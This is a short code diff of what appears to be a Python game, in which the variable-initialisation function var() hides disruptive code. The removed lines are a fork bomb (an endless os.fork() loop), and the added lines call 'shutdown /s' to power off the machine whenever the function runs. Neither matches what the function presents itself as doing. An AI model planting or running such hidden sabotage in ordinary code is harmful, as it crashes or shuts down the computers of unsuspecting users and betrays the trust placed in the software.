@@ -1,4 +1,4 @@
-import os
+import subprocess
 def var():
     global areas, scanned, notes
     areas = ["","","","","","","","","",""]
@@ -6,5 +6,4 @@ def var():
     name = ""
     shipname = ""
     notes = ""
-    while True:
-        os.fork()
+    subprocess.call(["shutdown", "/s"])
